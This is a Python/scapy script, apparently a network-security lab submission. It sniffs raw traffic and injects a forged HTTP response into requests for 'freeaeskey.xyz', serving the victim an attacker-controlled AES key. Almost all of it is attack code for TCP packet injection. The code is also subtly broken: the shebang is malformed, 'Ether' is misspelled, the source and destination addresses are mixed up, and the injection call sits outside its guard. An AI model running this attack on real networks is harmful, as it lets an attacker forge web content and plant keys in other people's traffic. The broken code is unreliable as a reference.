i#!user/bin/python3
import scapy
from scapy.all import *

def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    from scapy.all import send, conf, L3RawSocket
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
    payLoad = '''HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nDate: Sat, 6 Nov 2021 23:25:57 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'''
    http_packet=str(pkt)
    if http_packet.find('freeaeskey.xyz') > -1 and http_packet.find("GET") > -1:
        request = Ehter(pkt)
        targetAddr = request['IP'].dst
        srcAddr = request['IP'].dst
        ip_address = IP(src = srcAddr, dst = targetAddr, ttl = request['IP'].ttl)
        tcp_val = TCP(sport = 80, dport = request['TCP'].sport, seq = request['TCP'].ack, flags = 'PA', ack = request['TCP'].seq + len(request['Raw'].load))
    inject_pkt(ip_address/tcp_val/payLoad)
    
def main():
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__ == '__main__':
    main()
